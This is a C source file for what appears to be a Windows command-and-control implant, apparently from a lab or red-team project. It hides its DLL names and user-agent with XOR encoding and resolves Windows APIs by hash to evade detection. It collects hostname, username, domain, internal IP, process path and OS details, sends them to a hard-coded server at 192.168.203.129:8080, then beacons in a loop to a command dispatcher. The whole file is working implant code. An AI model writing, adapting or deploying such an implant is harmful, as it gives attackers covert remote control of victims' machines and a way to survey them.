#include "Command.h"
#include "Package.h"
#include "Transport.h"
#include "Resolve.h"
#include "Hashes.h"
#include <stdio.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <winternl.h>

#define CONFIG_HOST       L"192.168.203.129"
#define CONFIG_PORT       8080
#define CONFIG_SLEEP      10
#define xor_key           0x8F

static void xor_dec(PUCHAR buf, SIZE_T len){
	for (SIZE_T i = 0; i < len; i++)
		buf[i] ^= xor_key;
}
static void xor_decw(PWCHAR buf, SIZE_T len){
	for (SIZE_T i = 0; i < len; i++)
		buf[i] ^= xor_key;
}

UINT32          g_AgentID       = 0;
DWORD           g_SleepTime     = CONFIG_SLEEP;
BOOL            g_Connected     = FALSE;
TRANSPORT_CFG   g_TransportCfg  = { 0 };

UINT32 GenAgentID(){
    typedef ULONG (WINAPI* fn_RtlRandomEx)(PULONG);
    typedef DWORD (WINAPI* fn_GetTickCount)(VOID);

    HMODULE ntdll = ResolveModuleH(H_NTDLL);
    HMODULE k32   = ResolveModuleH(H_KERNEL32);
    if (!ntdll || !k32) return 0x41414141;

    fn_RtlRandomEx  pRandom = (fn_RtlRandomEx)ResolveFuncH(ntdll, H_RtlRandomEx);
    fn_GetTickCount  pTick   = (fn_GetTickCount)ResolveFuncH(k32, H_GetTickCount);
    if (!pRandom || !pTick) return 0x41414141;

    ULONG seed = pTick();
    seed = pRandom(&seed);
    seed = pRandom(&seed);
    return seed & 0x7FFFFFFF;
}

BOOL Register(){
    typedef BOOL (WINAPI* fn_GetComputerNameExA)(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
    typedef BOOL (WINAPI* fn_GetUserNameA)(LPSTR, LPDWORD);
    typedef DWORD (WINAPI* fn_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    typedef DWORD (WINAPI* fn_GetCurrentProcessId)(VOID);
    typedef VOID (WINAPI* fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
    typedef VOID (WINAPI* fn_RtlGetVersion)(POSVERSIONINFOEXW);
    typedef DWORD (WINAPI* fn_GetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);

    HMODULE k32    = ResolveModuleH(H_KERNEL32);
    HMODULE ntdll  = ResolveModuleH(H_NTDLL);
    HMODULE iphlp  = ResolveModuleH(H_IPHLPAPI);
    HMODULE adv    = ResolveModuleH(H_ADVAPI32);
    if (!k32 || !ntdll) return FALSE;

    fn_GetComputerNameExA pCompName = (fn_GetComputerNameExA)ResolveFuncH(k32, H_GetComputerNameExA);
    fn_GetUserNameA       pUserName = adv ? (fn_GetUserNameA)ResolveFuncH(adv, H_GetUserNameA) : NULL;
    fn_GetModuleFileNameA pModPath  = (fn_GetModuleFileNameA)ResolveFuncH(k32, H_GetModuleFileNameA);
    fn_GetCurrentProcessId pGetPid  = (fn_GetCurrentProcessId)ResolveFuncH(k32, H_GetCurrentProcessId);
    fn_GetNativeSystemInfo pSysInfo = (fn_GetNativeSystemInfo)ResolveFuncH(k32, H_GetNativeSystemInfo);
    fn_Alloc              pAlloc    = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_Free               pFree    = (fn_Free)ResolveFuncH(k32, H_LocalFree);

    fn_RtlGetVersion      pOsVer   = (fn_RtlGetVersion)ResolveFuncH(ntdll, H_RtlGetVersion);

    fn_GetAdaptersInfo    pAdapters = NULL;
    if (iphlp)
        pAdapters = (fn_GetAdaptersInfo)ResolveFuncH(iphlp, H_GetAdaptersInfo);

    if (!pCompName || !pUserName || !pModPath || !pGetPid || !pAlloc || !pFree || !pOsVer)
        return FALSE;

    PPACKAGE         pkg     = PackageCreate(COMMAND_REGISTER);
    PVOID            resp    = NULL;
    SIZE_T           sz      = 0;
    PVOID            buf     = NULL;
    SIZE_T           len     = 0;
    PIP_ADAPTER_INFO adapter = NULL;
    OSVERSIONINFOEXW osver   = { 0 };
    SYSTEM_INFO      sysinfo = { 0 };

    // agent id
    PackageAddInt32(pkg, g_AgentID);

    // hostname
    len = 0;
    pCompName(ComputerNameNetBIOS, NULL, (LPDWORD)&len);
    if (len > 0 && (buf = pAlloc(LPTR, len))){
        pCompName(ComputerNameNetBIOS, buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, len);
        pFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // username
    len = MAX_PATH;
    if ((buf = pAlloc(LPTR, len))){
        pUserName(buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, strlen(buf));
        pFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // domain
    len = 0;
    pCompName(ComputerNameDnsDomain, NULL, (LPDWORD)&len);
    if (len > 0 && (buf = pAlloc(LPTR, len))){
        pCompName(ComputerNameDnsDomain, buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, len);
        pFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // internal ip
    if (pAdapters) {
        len = 0;
        pAdapters(NULL, (PULONG)&len);
        if ((adapter = pAlloc(LPTR, len))){
            if (pAdapters(adapter, (PULONG)&len) == NO_ERROR)
                PackageAddBytes(pkg, (PUCHAR)adapter->IpAddressList.IpAddress.String, strlen(adapter->IpAddressList.IpAddress.String));
            else
                PackageAddBytes(pkg, (PUCHAR)"0.0.0.0", 7);
            pFree(adapter); adapter = NULL;
        } else PackageAddBytes(pkg, (PUCHAR)"0.0.0.0", 7);
    } else PackageAddBytes(pkg, (PUCHAR)"0.0.0.0", 7);

    // process path
    len = MAX_PATH;
    if ((buf = pAlloc(LPTR, len))){
        len = pModPath(NULL, buf, len);
        PackageAddBytes(pkg, buf, len);
        pFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // pid ppid
    PackageAddInt32(pkg, pGetPid());
    PackageAddInt32(pkg, 0);

    // process arch
    #ifdef _WIN64
    PackageAddInt32(pkg, 15);
    #else
    PackageAddInt32(pkg, 10);
    #endif

    // elevated
    PackageAddInt32(pkg, FALSE);

    osver.dwOSVersionInfoSize = sizeof(osver);
    pOsVer(&osver);

    PackageAddInt32(pkg, osver.dwMajorVersion);
    PackageAddInt32(pkg, osver.dwMinorVersion);
    PackageAddInt32(pkg, osver.wProductType);
    PackageAddInt32(pkg, osver.wServicePackMajor);
    PackageAddInt32(pkg, osver.dwBuildNumber);

    // os arch
    if (pSysInfo) {
        pSysInfo(&sysinfo);
        PackageAddInt32(pkg, sysinfo.wProcessorArchitecture);
    } else PackageAddInt32(pkg, 0);

    PackageAddInt32(pkg, g_SleepTime);

    if (!PackageTransmit(pkg, &resp, &sz))
        return FALSE;

    if (!resp || sz < 4)
        return FALSE;

    UINT32 got = *(UINT32*)resp;
    pFree(resp);

    if (got == g_AgentID){
        g_Connected = TRUE;
        return TRUE;
    }
    return FALSE;
}

INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, INT nShow){
    typedef VOID (WINAPI* fn_Sleep)(DWORD);
    typedef HMODULE (WINAPI* fn_LoadLibraryA)(LPCSTR);

    WCHAR sUA[] = { 0x00C2,0x00E0,0x00F5,0x00E6,0x00E3,0x00E3,0x00EE,0x00A0,0x00BA,0x00A1,0x00BF,0x00AF,0x00A7,0x00D8,0x00E6,0x00E1,0x00EB,0x00E0,0x00F8,0x00FC,0x00AF,0x00C1,0x00DB,0x00AF,0x00B9,0x00A1,0x00BE,0x00B4,0x00AF,0x00D8,0x00C0,0x00D8,0x00B9,0x00BB,0x00A6,0x00AF,0x00CE,0x00FF,0x00FF,0x00E3,0x00EA,0x00D8,0x00EA,0x00ED,0x00C4,0x00E6,0x00FB,0x00A0,0x00BA,0x00BC,0x00B8,0x00A1,0x00BC,0x00B9,0x00AF,0x00A7,0x00C4,0x00C7,0x00DB,0x00C2,0x00C3,0x00A3,0x00AF,0x00E3,0x00E6,0x00E4,0x00EA,0x00AF,0x00C8,0x00EA,0x00EC,0x00E4,0x00E0,0x00A6,0x00AF,0x00CC,0x00E7,0x00FD,0x00E0,0x00E2,0x00EA,0x00A0,0x00B6,0x00B9,0x00A1,0x00BF,0x00A1,0x00BB,0x00B9,0x00B9,0x00BB,0x00A1,0x00BE,0x00BE,0x00BF,0x00AF,0x00DC,0x00EE,0x00E9,0x00EE,0x00FD,0x00E6,0x00A0,0x00BA,0x00BC,0x00B8,0x00A1,0x00BC,0x00B9,0x0000 };
    xor_decw(sUA, 109);
    g_TransportCfg.UserAgent = sUA;
    g_TransportCfg.Host      = CONFIG_HOST;
    g_TransportCfg.Port      = CONFIG_PORT;
    g_TransportCfg.Secure    = FALSE;

    HMODULE k32 = ResolveModuleH(H_KERNEL32);

    fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)ResolveFuncH(k32, H_LoadLibraryA);
    if (pLoadLib){
        UCHAR s1[] = { 0xF8,0xE6,0xE1,0xE7,0xFB,0xFB,0xFF,0xA1,0xEB,0xE3,0xE3,0x00 };
        UCHAR s2[] = { 0xE6,0xFF,0xE7,0xE3,0xFF,0xEE,0xFF,0xE6,0xA1,0xEB,0xE3,0xE3,0x00 };
        UCHAR s3[] = { 0xEE,0xEB,0xF9,0xEE,0xFF,0xE6,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
        xor_dec(s1, 11); xor_dec(s2, 12); xor_dec(s3, 12);
        pLoadLib((LPCSTR)s1);
        pLoadLib((LPCSTR)s2);
        pLoadLib((LPCSTR)s3);
    }

    g_AgentID = GenAgentID();
    fn_Sleep pSleep = (fn_Sleep)ResolveFuncH(k32, H_Sleep);

    do {
        if (!g_Connected){
            if (Register())
                CommandDispatcher();
        }
        if (pSleep) pSleep(g_SleepTime * 1000);
    } while (TRUE);

    return 0;
}
